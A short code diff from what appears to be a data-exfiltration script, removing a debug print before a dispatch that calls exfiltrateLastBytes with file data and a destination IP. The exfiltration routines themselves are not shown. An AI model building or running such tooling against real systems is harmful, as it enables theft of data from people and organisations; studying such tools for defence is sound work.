@@ -86,8 +86,6 @@ if __name__ == "__main__":
 
     ip = args.dest
 
-    print data, ip, args.file
-
     if args.mode == 1:
         exfiltrateLastBytes(data, ip, args.file)
     elif args.mode == 2:
